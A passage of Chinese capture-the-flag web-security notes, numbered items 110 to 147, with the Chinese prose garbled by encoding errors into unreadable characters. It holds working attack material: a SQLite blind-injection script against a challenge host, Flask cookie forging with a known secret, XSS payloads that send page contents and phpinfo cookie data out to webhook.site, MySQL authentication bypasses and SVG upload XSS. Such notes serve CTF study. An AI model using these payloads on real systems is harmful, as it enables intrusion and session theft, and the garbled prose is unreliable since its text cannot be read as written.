110. å¦‚æœå½“å‰çš„æƒé™ä¸å¤Ÿï¼Œæƒ³ç”¨å·²çŸ¥æœ‰æƒé™çš„è´¦å·cat flagï¼Œå¯ç”¨ï¼š

- printf "GWHTCTF" | su - GWHT -c 'cat /GWHT/system/of/a/down/flag.txt'

è¿™é‡Œçš„è´¦å·åä¸ºGWHTï¼Œå¯†ç ä¸ºGWHTCTFã€‚

111. curlå‘é€è‡ªå®šä¹‰æ•°æ®åŒ…ï¼ˆPUTæ–¹æ³•ï¼Œoriginï¼Œ-ué€‰é¡¹ç­‰ï¼‰ã€‚ä¾‹é¢˜:[[BSidesCF 2020]Hurdles](https://blog.csdn.net/weixin_44037296/article/details/112298411)
112. thinkphp V6.0.x ååºåˆ—åŒ–é“¾åˆ©ç”¨ã€‚ä¾‹é¢˜:[[å®‰æ´µæ¯ 2019]iamthinking](https://xz.aliyun.com/t/9546)
113. php hash_hamcå‡½æ•°ç»•è¿‡ã€‚`hash_hmac($algo, $data, $key)`ï¼šå½“ä¼ å…¥çš„dataä¸ºæ•°ç»„æ—¶ï¼ŒåŠ å¯†å¾—åˆ°çš„ç»“æœå›ºå®šä¸ºNULLã€‚ä¾‹é¢˜:[[ç¾ŠåŸæ¯ 2020]Blackcat](https://blog.csdn.net/qq_46263951/article/details/119796671)
114. node js 8.12.0ç‰ˆæœ¬çš„[æ‹†åˆ†æ”»å‡»ï¼ˆCRLFï¼‰å¯é€ æˆSSRF](https://xz.aliyun.com/t/2894)+pugæ¨¡æ¿å¼•æ“å‘½ä»¤æ‰§è¡Œã€‚ä¾‹é¢˜:[[GYCTF2020]Node Game](https://blog.csdn.net/cjdgg/article/details/119068329)
115. php7.4çš„FFIæ‰©å±•å®‰å…¨é—®é¢˜ä»¥åŠåˆ©ç”¨ï¼ˆç»•è¿‡disabled functionsï¼‰ã€‚ä¾‹é¢˜:[[RCTF 2019]Nextphp](https://blog.csdn.net/RABCDXB/article/details/120319633)
116. perl æ–‡ä»¶ä¸Šä¼ +ARGVçš„åˆ©ç”¨ã€‚ä¾‹é¢˜:[i-got-id-200](../../CTF/æ”»é˜²ä¸–ç•Œ/6çº§/Web/i-got-id-200.md)
117. unzipä¸­[è½¯é“¾æ¥](https://blog.csdn.net/weixin_44966641/article/details/119915004)çš„åˆ©ç”¨ã€‚ln -sæ˜¯Linuxçš„ä¸€ç§è½¯è¿æ¥,ç±»ä¼¼ä¸windowsçš„å¿«æ·æ–¹å¼ã€‚å¯ä»¥åˆ©ç”¨å‹ç¼©äº†è½¯é“¾æ¥çš„zipåŒ…[ä»»æ„è¯»å–æ–‡ä»¶](https://xz.aliyun.com/t/2589)ã€‚ä¾‹é¢˜:[[SWPU2019]Web3](https://blog.csdn.net/mochu7777777/article/details/105666388)
118. ç‰¹æ®Šçš„flask cookieä¼ªé€ ã€‚ä¸ä¸€èˆ¬çš„ä¸åŒï¼Œä½¿ç”¨get_signing_serializerã€‚

```python
from flask import Flask
from flask.sessions import SecureCookieSessionInterface
app = Flask(__name__)
app.secret_key = b'fb+wwn!n1yo+9c(9s6!_3o#nqm&&_ej$tez)$_ik36n8d7o6mr#y'
session_serializer = SecureCookieSessionInterface().get_signing_serializer(app)
def index():
    print(session_serializer.dumps("admin"))
index()
#ImFkbWluIg.Y9WDSA.AbIYU50Boq_syWcomulegtw9fnc
```

ä¾‹é¢˜:[[FBCTF2019]Event](https://blog.csdn.net/mochu7777777/article/details/107653920)

119. pythonåˆ©ç”¨typeå‡½æ•°[åŠ¨æ€åˆ›å»ºç±»](http://c.biancheng.net/view/2292.html)ã€‚
120. pythonè·¯å¾„æ‹¼æ¥os.path.join()å‡½æ•°å½“å…¶ä¸­ä¸€ä¸ªå‚æ•°ä¸ºç»å¯¹è·¯å¾„æ—¶ï¼Œå‰é¢çš„å‚æ•°ä¼šè¢«èˆå¼ƒï¼Œåˆ©ç”¨è¿™ä¸ªç‰¹ç‚¹å¯ä»¥ç»•è¿‡ä¸€äº›è·¯å¾„é™åˆ¶ã€‚ä¾‹é¢˜:[[HFCTF 2021 Final]easyflask](https://blog.csdn.net/LYJ20010728/article/details/117422046)
121. ä¸€æ®µæ•°æ®ä»¥rO0ABå¼€å¤´ï¼ŒåŸºæœ¬å¯ä»¥ç¡®å®šè¿™ä¸²å°±æ˜¯Javaåºåˆ—åŒ–base64åŠ å¯†çš„æ•°æ®;å¦‚æœä»¥acedå¼€å¤´ï¼Œé‚£ä¹ˆæ˜¯ä¸€æ®µJavaåºåˆ—åŒ–çš„16è¿›åˆ¶ã€‚
122. java [JDBCsqlæ³¨å…¥](https://www.wangan.com/docs/94)+burpsuite java Deserialization Scanneræ’ä»¶+ysoserialï¼ˆjavaååºåˆ—åŒ–æ¼æ´å·¥å…·ï¼‰ã€‚ä¾‹é¢˜:[[ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Think Java](https://blog.csdn.net/RABCDXB/article/details/124003575)
123. åœ¨phpsessioné‡Œå¦‚æœåœ¨php.iniä¸­è®¾ç½®session.auto_start=Onï¼Œé‚£ä¹ˆPHPæ¯æ¬¡å¤„ç†PHPæ–‡ä»¶çš„æ—¶å€™éƒ½ä¼šè‡ªåŠ¨æ‰§è¡Œsession_start()ï¼Œä½†æ˜¯session.auto_starté»˜è®¤ä¸ºOffã€‚ä¸Sessionç›¸å…³çš„å¦ä¸€ä¸ªè®¾ç½®å«[session.upload_progress.enabled](https://xz.aliyun.com/t/9545)ï¼Œé»˜è®¤ä¸ºOnï¼Œåœ¨è¿™ä¸ªé€‰é¡¹è¢«æ‰“å¼€åï¼Œåœ¨multipart POSTæ—¶ä¼ å…¥PHP_SESSION_UPLOAD_PROGRESSï¼ŒPHPä¼šæ‰§è¡Œsession_start()ã€‚å€Ÿæ­¤å¯ä»¥ç»•è¿‡ä¸€äº›éœ€è¦sessionæ‰èƒ½è®¿é—®çš„æ–‡ä»¶çš„é™åˆ¶ï¼Œç”šè‡³RCEã€‚ä¾‹é¢˜:[[PwnThyBytes 2019]Baby_SQL](https://blog.csdn.net/SopRomeo/article/details/108967248)ã€‚
124. node.jsæ—©æœŸç‰ˆæœ¬ï¼ˆ<8.0)ä¸­ï¼Œæ²™ç®±vm2æœ‰ä¸ªç‰¹æ€§ï¼šå½“ Buffer çš„æ„é€ å‡½æ•°ä¼ å…¥æ•°å­—æ—¶, ä¼šå¾—åˆ°ä¸æ•°å­—é•¿åº¦ä¸€è‡´çš„ä¸€ä¸ª Bufferï¼Œå¹¶ä¸”è¿™ä¸ª Buffer æ˜¯æœªæ¸…é›¶çš„ã€‚8.0 ä¹‹åçš„ç‰ˆæœ¬å¯ä»¥é€šè¿‡å¦ä¸€ä¸ªå‡½æ•° Buffer.allocUnsafe(size) æ¥è·å¾—æœªæ¸…ç©ºçš„å†…å­˜ã€‚ä¸€ä¸ªè°ƒç”¨è¿‡çš„å˜é‡ï¼Œä¸€å®šä¼šå­˜åœ¨å†…å­˜ä¸­ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨Bufferå‡½æ•°è¯»å–æ²™ç®±ä¹‹å¤–çš„å˜é‡å†…å®¹ï¼Œå®ç°æ²™ç®±é€ƒé€¸ã€‚ä¾‹é¢˜:[[HITCON 2016]Leaking](https://blog.csdn.net/weixin_44037296/article/details/112387663)
125. å¯¹äºSSRFï¼Œ127.0.0.1æ— æ³•ä½¿ç”¨çš„æƒ…å†µä¸‹ï¼Œå¯ä»¥è€ƒè™‘0.0.0.0ã€‚
126. [redis](https://blog.csdn.net/like98k/article/details/106417214) [ä¸»ä»å¤åˆ¶](https://www.cnblogs.com/karsa/p/14123957.html) [SSRF](https://xz.aliyun.com/t/5665)ï¼ˆRCEï¼‰ã€‚ä¸»è¦åˆ©ç”¨[Redis Rogue Server](https://github.com/n0b0dyCN/redis-rogue-server)å’Œ[redis-ssrf](https://github.com/xmsec/redis-ssrf)ä¸¤ä¸ªå·¥å…·ã€‚ä¾‹é¢˜:[[ç½‘é¼æ¯ 2020 ç„æ­¦ç»„]SSRFMe](https://blog.csdn.net/rfrder/article/details/113651337)
127. [[NPUCTF2020]éªŒè¯ğŸ](https://blog.csdn.net/hiahiachang/article/details/105756697)ã€‚æœ¬é¢˜çš„çŸ¥è¯†ç‚¹æœ‰ï¼š

- jsä¸­åˆ—è¡¨ï¼Œå¯¹è±¡ç­‰ä¸å­—ç¬¦ä¸²ç›¸åŠ ä¼šå¯¼è‡´å¼ºåˆ¶ç±»å‹è½¬æ¢ï¼Œç»“æœä¸ºå­—ç¬¦ä¸²ã€‚å¯ç”¨è¿™ä¸ªç‰¹ç‚¹ç»•è¿‡ä¸€äº›md5åŠ ç›ã€‚ä»¥åŠï¼Œç»•è¿‡md5æ—¶å¦‚æœç¨‹åºå¯ç”¨äº†jsonï¼Œå¯ä»¥åˆ©ç”¨jsonæ„é€ å¯¹è±¡ç»•è¿‡å¤§éƒ¨åˆ†é™åˆ¶ã€‚
- jsåˆ©ç”¨__proto__å¯ä»åŸå‹é“¾ä¸Šå¼•å‡ºFunctionå’ŒStringï¼ŒFunctionç”¨äºæ„é€ å‡½æ•°ï¼ŒStringç”¨äºå¾—åˆ°fromCharCodeç»•è¿‡å¼ºåˆ¶è¿‡æ»¤ã€‚åˆ©ç”¨`process.mainModule.require('child_process').execSync('cat /flag')`è¿›è¡Œrceï¼ŒåŒæ—¶è¿˜åˆ©ç”¨äº†ç®­å¤´å‡½æ•°ã€‚

128. å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å†…å®¹æ¥ç»•è¿‡phpçš„getmagesize()å‡½æ•°è·å¾—çš„å›¾ç‰‡é•¿å®½ã€‚

```
#define width 1
#define height 1
```

æ”¾å¤´éƒ¨å’Œæœ«å°¾éƒ½å¯ä»¥ã€‚

129. phpçš„mb_strtolower()å‡½æ•°å¯ç”¨äºç»•è¿‡ä¸€äº›è¿‡æ»¤ã€‚

```php
<?php
var_dump(mb_strtolower('Ä°')==='i');
//true
?>
```

130. å¯ç»•è¿‡php getmagesize()å‡½æ•°çš„å›¾ç‰‡é©¬ç”Ÿæˆ[å·¥å…·](https://github.com/huntergregal/PNG-IDAT-Payload-Generator)ã€‚ä¾‹é¢˜:[[CISCN2021 Quals]upload](https://blog.csdn.net/jiangdie666/article/details/116997461)
131. ç½‘é¡µç‰ˆpostä¸Šä¼ æ–‡ä»¶ä»£ç ã€‚

```html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>POSTæ•°æ®åŒ…POC</title>
</head>
<body>
<form action="http://faebbc7b-35b5-4792-8b8a-9af1ec7fc48f.node3.buuoj.cn/upload.php?ctf=upload" method="post" enctype="multipart/form-data">
<!--é“¾æ¥æ˜¯å½“å‰æ‰“å¼€çš„é¢˜ç›®é“¾æ¥-->
    <label for="file">æ–‡ä»¶åï¼š</label>
    <input type="file" name="postedFile" id="postedFile"><br>
    <input type="submit" name="submit" value="æäº¤">
</form>
</body>
</html>
```

132. [MongoDB](https://zhuanlan.zhihu.com/p/87722764) sqlæ³¨å…¥ã€‚å’Œæ™®é€šsqlæ³¨å…¥ç›¸ä¼¼ï¼Œåªæ˜¯MongoDBè¿˜æ”¯æŒjsè¯­æ³•ï¼Œæ‰€ä»¥æœ‰çš„æ—¶å€™å¯ä»¥ç›´æ¥ç”¨jsæŠ¥é”™çˆ†å‡ºå­—æ®µå€¼ã€‚ä¾‹é¢˜:[[2021ç¥¥äº‘æ¯]Package Manager 2021](https://blog.csdn.net/RABCDXB/article/details/124810618)
133. åœ¨æ­£åˆ™åŒ¹é…çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰ç”¨^$åŒ¹é…å¤´éƒ¨æˆ–è€…å°¾éƒ¨ï¼Œå°±ä¼šå­˜åœ¨ç®€å•çš„ç»•è¿‡ã€‚æ¯”å¦‚ä¸‹é¢çš„æ­£åˆ™ï¼š

```js
const checkmd5Regex = (token: string) => {
  return /([a-f\d]{32}|[A-F\d]{32})/.exec(token);
}
```

åªéœ€è¦åœ¨æƒ³å¡«çš„å€¼å‰é¢åŠ ä¸Š32ä¸ªä»»æ„å­—ç¬¦å³å¯ç»•è¿‡ã€‚

134. ä¸‹é¢è¿™æ®µä»£ç ï¼š

```php
if($count[]=1)
```

è¡¨ç¤ºç»™\$count[]æ•°ç»„æœ«å°¾æ·»åŠ ä¸€ä¸ª1ï¼Œå¦‚æœæ·»åŠ æˆåŠŸè¿”å›1ï¼Œå¦åˆ™0ã€‚è¿™ä¸ªå¯ä»¥ç”¨phpçš„æ•´å½¢æº¢å‡ºç»•è¿‡ã€‚å¦‚æœæ•°ç»„é‡Œå·²æœ‰9223372036854775807ä¸ªå…ƒç´ ï¼Œæœ«å°¾å†å¢æ·»å…ƒç´ å°±ä¼šæ•´å½¢æº¢å‡ºï¼Œå¯¼è‡´è¿”å›falseã€‚

135. æ”»å‡» [php-fpm](https://tttang.com/archive/1775/) /pfsockopenç»•è¿‡ disable_functions+[SUIDææƒ](https://tttang.com/archive/1793/#toc_find-exec)ã€‚ä¾‹é¢˜:[[è“å¸½æ¯ 2021]One Pointer PHP](https://blog.csdn.net/cosmoslin/article/details/121332240)
136. [åˆ©ç”¨pearcmd.phpä»LFIåˆ°getshell](https://blog.csdn.net/rfrder/article/details/121042290)ã€‚ä¾‹é¢˜:[[HXBCTF 2021]easywill](https://cn-sec.com/archives/1478076.html)ã€‚æä¾›pç¥çš„å¦ä¸€ç¯‡[æ–‡ç« ](https://www.leavesongs.com/PENETRATION/docker-php-include-getshell.html)ã€‚
137. sqlæ³¨å…¥åˆ©ç”¨hexç»•è¿‡è¿‡æ»¤+åˆ©ç”¨ä½è¿ç®—åˆ¤æ–­flag16è¿›åˆ¶é•¿åº¦+åˆ©ç”¨[replace](https://blog.csdn.net/bingguang1993/article/details/80592579)å’Œ[case-when-then](https://zhuanlan.zhihu.com/p/165423831)ç›²æ³¨ã€‚è¿™é¢˜çš„æ€è·¯å¾ˆå·§å¦™ï¼Œé¦–å…ˆæ˜¯ä½è¿ç®—ç®—flagé•¿åº¦ï¼š`å‡è®¾flagçš„é•¿åº¦ä¸º x,è€Œy è¡¨ç¤º 2 çš„ n æ¬¡æ–¹,é‚£ä¹ˆ x&y å°±èƒ½è¡¨ç°å‡ºxäºŒè¿›åˆ¶ä¸º1çš„ä½ç½®,å°†è¿™äº› y å†è¿›è¡Œæˆ–è¿ç®—å°±å¯ä»¥å¾—åˆ°å®Œæ•´çš„ x çš„äºŒè¿›åˆ¶,ä¹Ÿå°±å¾—åˆ°äº† flag çš„é•¿åº¦`ã€‚ç„¶åæ˜¯æ„é€ æŠ¥é”™è¯­å¥å®ç°ç›²æ³¨ï¼š`åœ¨sqlite3ä¸­,abså‡½æ•°æœ‰ä¸€ä¸ªæ•´æ•°æº¢å‡ºçš„æŠ¥é”™,å¦‚æœabsçš„å‚æ•°æ˜¯-9223372036854775808å°±ä¼šæŠ¥é”™,åŒæ ·å¦‚æœæ˜¯æ­£æ•°ä¹Ÿä¼šæŠ¥é”™`ã€‚åˆå› ä¸ºå¼•å·è¢«è¿‡æ»¤ï¼Œæ— æ³•ç›´æ¥è¾“å…¥aï¼Œbè¿™ç±»16è¿›åˆ¶æ•°å­—ï¼Œé trimæ•°æ®åº“é‡Œå·²æœ‰çš„æ•°æ®çš„16è¿›åˆ¶æ¥å¾—åˆ°æ‰€æœ‰çš„16è¿›åˆ¶å­—ç¬¦ï¼Œæœ€åæ›´æ˜¯åˆ©ç”¨absçš„æ€§è´¨æŠ¥é”™å®ç°ç›²æ³¨ã€‚

```python
# coding: utf-8
import binascii
import requests
URL = 'http://85ede6a8-f6ba-463f-996d-499f800d6cf0.node4.buuoj.cn:81/vote.php'
l = 0
i = 0
for j in range(16):
  r = requests.post(URL, data={
    'id': f'abs(case(length(hex((select(flag)from(flag))))&{1<<j})when(0)then(0)else(0x8000000000000000)end)'
  })
  if b'An error occurred' in r.content:
    l |= 1 << j
print('[+] length:', l)
table = {}
table['A'] = 'trim(hex((select(name)from(vote)where(case(id)when(3)then(1)end))),12567)'
table['C'] = 'trim(hex(typeof(.1)),12567)'
table['D'] = 'trim(hex(0xffffffffffffffff),123)'
table['E'] = 'trim(hex(0.1),1230)'
table['F'] = 'trim(hex((select(name)from(vote)where(case(id)when(1)then(1)end))),467)'
table['B'] = f'trim(hex((select(name)from(vote)where(case(id)when(4)then(1)end))),16||{table["C"]}||{table["F"]})'
res = binascii.hexlify(b'flag{').decode().upper()
for i in range(len(res), l):
  for x in '0123456789ABCDEF':
    t = '||'.join(c if c in '0123456789' else table[c] for c in res + x)
    r = requests.post(URL, data={
      'id': f'abs(case(replace(length(replace(hex((select(flag)from(flag))),{t},trim(0,0))),{l},trim(0,0)))when(trim(0,0))then(0)else(0x8000000000000000)end)'
    })
    if b'An error occurred' in r.content:
      res += x
      break
  print(f'[+] flag ({i}/{l}): {res}')
  i += 1
print('[+] flag:', binascii.unhexlify(res).decode())
```

é¢˜ç›®:[[HarekazeCTF2019]Sqlite Voting](https://blog.csdn.net/qq_46263951/article/details/119727922)

138. [uuid v1](https://versprite.com/blog/universally-unique-identifiers/)æ˜¯å¯ä»¥é¢„æµ‹çš„,å› æ­¤ç”¨v1ç‰ˆæœ¬çš„uuidåšèº«ä»½è®¤è¯æœ‰è¢«çˆ†ç ´é¢„æµ‹uuidçš„é£é™©ã€‚åœ¨jsé‡Œï¼Œnode IDå’Œclock sequenceå¦‚ä¸‹ç»™å‡ºï¼š

```js
var adminuuid = uuid.v1({'node': [0x67, 0x69, 0x6E, 0x6B, 0x6F, 0x69], 'clockseq': 0b10101001100100});
//node=0x67696e6b6f69
//clockseq=0b10101001100100=0x2a64,ç¬¬ä¸€ä½ä¼šæ ¹æ®UUID variantå˜åŒ–
```

pythoné‡Œåˆ™æ˜¯ï¼š

```python
UUIDv1 = str(uuid1(node=0x67696E6B6F69, clock_seq=0b10101001100100))
```

ä¾‹é¢˜:[uuid hell](https://ctftime.org/writeup/36173)

139. Mercurial SCM .hgæ–‡ä»¶å¤¹æ³„éœ²ã€‚Mercurial SCMä¹Ÿæœ‰ä¸€ä¸ªå’Œgitç±»ä¼¼çš„åº“ç®¡ç†å‘½ä»¤ï¼šhgã€‚æ³¨æ„å®ƒåœ¨é‡è§ç‰¹æ®Šå­—ç¬¦æ—¶ä¼šè½¬ä¹‰ï¼Œä½†æ˜¯è½¬ä¹‰ç¬¦æ˜¯"_"ã€‚æ„å‘³ç€ä¸€ä¸ªåå­—åŒ…å«ä¸€ä¸ªä¸‹åˆ’çº¿çš„æ–‡ä»¶æœ€ç»ˆæ–‡ä»¶åé‡Œä¼šæœ‰ä¸¤ä¸ªä¸‹åˆ’çº¿ã€‚ä¾‹é¢˜:[my-chemical-romance](https://ctftime.org/writeup/36174)
140. xssç»•è¿‡[HttpOnly](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#restrict_access_to_cookies)å’Œ`default-src 'none'; script-src 'unsafe-inline'`[csp](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP)è®¾ç½®ã€‚å‰è€…è®©æˆ‘ä»¬æ— æ³•document.cookieç›—å–admin cookieå€¼ï¼Œåè€…å…è®¸å†…åµŒå¼jsè„šæœ¬ï¼Œä½†ä¸å…è®¸ä»¥ä»»ä½•å½¢å¼åŠ è½½æ–‡ä»¶ï¼ŒåŒ…æ‹¬æœåŠ¡å™¨è‡ªèº«çš„ã€‚æ„å‘³ç€æ— æ³•ä»¥ä»»ä½•å¸¸è§çš„å½¢å¼å‘é€è¯·æ±‚ï¼Œæ¯”å¦‚å¸¸ç”¨çš„fetchã€‚æ›¿ä»£æ–¹å¼æ˜¯ä»¥formçš„å½¢å¼å‘é€POSTã€‚

```html
<form method="post" id="theForm" action="/flag"></form> <!-- actionå¡«è¦è®¿é—®çš„ç½‘å€ -->
<script> 
    document.getElementById('theForm').submit();
</script>
```

å¦‚æœè¦æ‰“å¼€çš„ç›®æ ‡ç½‘é¡µä¼šé‡å®šå‘ï¼Œå¯ä»¥è€ƒè™‘åœ¨ä»£ç ä¸­åŠ å…¥æ‰“å¼€å¦ä¸€ä¸ªçª—å£çš„æ“ä½œï¼Œä½¿ç”¨setTimeoutå‡½æ•°ä¿æŒå½“å‰ç½‘é¡µè„šæœ¬çš„è¿è¡Œï¼Œåœ¨æ‰“å¼€çš„çª—å£ä¸­è·å–åˆ°flagã€‚ä¾‹å¦‚:

```html
<form method="post" id="theForm" action="/flag" target='bruh'>
    <!-- Form body here -->
</form>
<script> 
    let w = window.open('','bruh');
    document.getElementById('theForm').submit();
    setTimeout(()=>{
        document.location= `https://webhook.site/645c6365-01c7-4535-a172-a9014e389741?c=${w.document.body.innerHTML}`
    },500);
</script>
```

ä¾‹é¢˜:[california-state-police](https://blog.jaquiez.dev/Blog/LACTF2023/#CSP)

å¦‚æœéè¦åœ¨å¼€å¯HttpOnlyçš„æƒ…å†µä¸‹è·å–cookieï¼Œåœ¨phpé©±åŠ¨çš„ç½‘ç«™ä¸‹ï¼Œå°è¯•æ‰¾phpinfoç•Œé¢ï¼Œé‡Œé¢æœ‰ä¸ªHTTP_COOKIEå­—æ®µã€‚xssè®©botè®¿é—®phpinfoç•Œé¢ï¼Œæ‰¾HTTP_COOKIEå­—æ®µå°±èƒ½æ‹¿åˆ°cookieäº†ã€‚è„šæœ¬å‚è€ƒï¼š

```html
<script>
fetch('/phpinfo.php', {
method: 'POST'})
.then((response) => response.text())
.then((data) => fetch('webhookä¹‹ç±»ç½‘å€', {
method: 'POST',body:btoa(data)}));
</script>
```

141. jsä¸­çš„type jugglingã€‚å®¡æŸ¥æºç æ—¶ï¼Œå¯èƒ½ä¼šå‘ç°æœåŠ¡å™¨æœŸæœ›è¾“å…¥å˜é‡æ˜¯å­—ç¬¦ä¸²ç­‰ç®€å•ç±»å‹ï¼Œä½†å¦‚æœæ²¡æœ‰å¯¹å˜é‡åšä¸¥æ ¼è¿‡æ»¤ï¼Œæˆ–æ˜¯ä½¿ç”¨äº†expressçš„`express.urlencoded()`ï¼ˆå…¶extendedå±æ€§é»˜è®¤æ¥å—å¤æ‚ç±»å‹ï¼‰ï¼Œå°±å¯ä»¥å°è¯•æ”»å‡»ï¼Œæ¯”å¦‚æ”¹æˆæ•°ç»„ä¹‹ç±»çš„ã€‚ä¾‹é¢˜:[queue up!](https://github.com/sambrow/ctf-writeups/blob/main/2023/la-ctf/queue-up.md)
142. å½“xssä»£ç ä»¥innerHTMLå½¢å¼æ’å…¥æ—¶ï¼Œæµè§ˆå™¨ä¸ä¼šæ‰§è¡Œè¿™æ ·çš„ä»£ç ã€‚å¯ä»¥ç”¨`<img/src=1 onerror=function()>`æ›¿ä»£ã€‚
143. jsçš„å¤šè¡Œæ³¨é‡Š/\*\*/å¯ç”¨äºç»•è¿‡æ»¤å’Œè·¨å¤šè¡Œæ‰§è¡Œxssï¼Œä¸è¿‡è¦æ³¨æ„ï¼Œå¤šè¡Œæ³¨é‡Šä¸è¦ç”¨åœ¨jså…³é”®å­—ä¸­é—´ï¼Œä¾‹å¦‚`win/**/dow`ã€‚å› ä¸ºjsä¼šæŠŠ/\*\*/è§£é‡Šä¸ºç©ºæ ¼ï¼Œwindowå°±å¤±æ•ˆäº†ã€‚ä¾‹é¢˜:[hptla](https://blog.jaquiez.dev/Blog/LACTF2023/#hptla)
144. typescript+ssrfã€‚ä¾‹é¢˜:[[2021ç¥¥äº‘æ¯]secrets_of_admin](https://blog.csdn.net/weixin_46081055/article/details/123959252)ã€‚æ­¤é¢˜çš„çŸ¥è¯†ç‚¹ï¼š

- ä¸‹é¢è¿™ä¸ªè·¯ç”±ï¼š

```ts
router.get('/api/files/:id'...)
```

å½“æˆ‘ä»¬è®¿é—®`http://xxx.com/api/files/aaa`æ—¶ï¼Œaaaå°±æ˜¯idçš„å€¼ã€‚
- åˆ©ç”¨\<img\>æ ‡ç­¾çš„srcå±æ€§è§¦å‘ssrfã€‚\<img\>æ ‡ç­¾ä¼šåŠ è½½srcæŒ‡å®šçš„èµ„æºï¼Œå¦‚æœæˆ‘ä»¬å¾€srcé‡Œè¾“å…¥æƒ³è¦ssrfçš„ç›®æ ‡ç½‘å€ï¼Œè‡ªç„¶å°±æ˜¯ç”¨å½“å‰æœåŠ¡å™¨çš„èº«ä»½æ„é€ äº†ä¸€æ¬¡ssrfäº†ã€‚å…¶ä»–æœ‰ç±»ä¼¼å±æ€§çš„æ ‡ç­¾ä¹Ÿå¯ä»¥è¿™ä¹ˆç”¨ã€‚å½“ç„¶ï¼Œå¯¹åº”ç½‘å€éœ€è¦è¢«åŠ è½½ï¼Œè¿™é¢˜é‡Œé¢è§¦å‘åœºæ™¯ä¸ºhtmlè½¬pdfæ—¶åŠ è½½å›¾ç‰‡èµ„æºã€‚
- `content.includes('<')`å¯ä»¥ç”¨æ•°ç»„ç±»å‹çš„`content[]`ç»•è¿‡ã€‚
- http-pdf ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ã€‚å¯ä»¥ç”¨XHRï¼ˆXMLHttpRequestï¼‰ä»»æ„æ–‡ä»¶è¯»å–ã€‚
- tså¼€æ”¾åœ¨8888ç«¯å£ã€‚
- å½“çœ‹åˆ°`filename   VARCHAR(255) NOT NULL UNIQUE`çš„æ•°æ®åº“é…ç½®,è¯´æ˜filenameè¿™ä¸ªå­—æ®µå€¼ä¸èƒ½é‡å¤ã€‚è¿™é“é¢˜çš„è§£å†³æ–¹æ³•æ˜¯æ„é€ åƒåœ¾ç›®å½•ï¼ˆflagå·²æœ‰ï¼Œæ„é€ ./flagï¼Œç”±äºè·¯å¾„å­—ç¬¦ä¸²æ‹¼æ¥ï¼Œæ²¡æœ‰å½±å“ï¼‰ã€‚

145. mysqlæŸ¥è¯¢ç‰¹æ€§ã€‚

- ä¸åˆ†å¤§å°å†™/å¤šä½™ç©ºæ ¼ã€‚ä¸‹é¢çš„ä»£ç ï¼š

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if ($username=="admin" && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //æŸ¥è¯¢é€»è¾‘ï¼Œç”¨æˆ·åå’Œå¯†ç ä¸ºadmin/adminï¼ŒæŸ¥å¾—å‡ºæ¥å°±ç»™flag
}
```

å¯ä»¥ç”¨`http://xxx.com?username=Admin&password=admin`æ¥ç»•è¿‡ã€‚å°±ç®—å¡«å†™çš„ç”¨æˆ·åæ˜¯Adminï¼Œä¾ç„¶èƒ½æŸ¥è¯¢å‡ºæ¥adminçš„æ•°æ®ã€‚å¦ä¸€ç§ç»•è¿‡æ–¹å¼æ˜¯`http://xxx.com?username=admin &password=admin`ï¼Œå¤šäº†ä¸ªç©ºæ ¼ã€‚
- é»˜è®¤å°†unicodeå­—ç¬¦è½¬ä¸ºå­—æ¯ã€‚

```php
$username=mysqli_real_escape_string($conn,$_GET['username']);
$password=mysqli_real_escape_string($conn,$_GET['password']);
if (preg_match("/admin/i",$username) && $_SERVER['REMOTE_ADDR']!=="127.0.0.1")
{
    die("Admins login are allowed locally only");
}
else
{
    //æŸ¥è¯¢é€»è¾‘ï¼Œç”¨æˆ·åå’Œå¯†ç ä¸ºadmin/adminï¼ŒæŸ¥å¾—å‡ºæ¥å°±ç»™flag
}
```

å¯ä»¥ç”¨`?username=Ã€dmin&password=admin`ç»•è¿‡ã€‚è¿™é‡Œä½¿ç”¨çš„`Ã€`ä¼šè¢«æ ‡å‡†åŒ–æˆAï¼Œä¸å½±å“æŸ¥è¯¢ç»“æœï¼Œä½†å¯ä»¥ç»•è¿‡æ­£åˆ™ã€‚å¦å¤–ï¼Œè¿™é“é¢˜è¿˜å‘Šè¯‰æˆ‘`$_SERVER['REMOTE_ADDR']!=="127.0.0.1"`æ˜¯ä¸å¯ç»•è¿‡çš„ã€‚

146. ä¸Šä¼ å›¾ç‰‡çš„xssæŒ‘æˆ˜å¯ä»¥è€ƒè™‘ä¸Šä¼ svgç±»å‹ï¼ˆsvgå›¾ç‰‡å­˜åœ¨`<script>`æ ‡ç­¾ï¼Œå¯ä»¥æ’å…¥xssä»£ç ï¼‰ã€‚
147. å¦‚æœæœåŠ¡å™¨è¿”å›çš„æŠ¥æ–‡æ²¡æœ‰`Content-Type`å­—æ®µï¼Œæµè§ˆå™¨å°±éœ€è¦å¼ºåˆ¶è§£æè¿”å›çš„å†…å®¹ï¼Œå€Ÿæ­¤å¯ä»¥æ‰§è¡Œä¸€äº›æ¶æ„ä»£ç ï¼ˆæ¯”å¦‚ä¸Šä¼ å›¾ç‰‡ï¼Œä½†æ˜¯å†…å®¹æ˜¯xssã€‚å¦‚æœæ­¤æ—¶æœåŠ¡å™¨ä¸è¿”å›images/pngçš„`Content-Type`ï¼Œæµè§ˆå™¨å°±è¦è§£æå›¾ç‰‡ï¼Œæ‰§è¡Œxssï¼‰ã€‚å¯¹äºapacheæœåŠ¡å™¨ï¼Œå½“æ–‡ä»¶åä¸å­˜åœ¨åç¼€æ—¶ï¼Œå®ƒä¸ä¼šè¿”å›`Content-Type`å­—æ®µã€‚è¿™äº›æ–‡ä»¶åæœ‰`.png`,`.jpg`ç”šè‡³`...png`ï¼ˆä»»æ„æ•°é‡çš„ç‚¹ï¼‰ã€‚
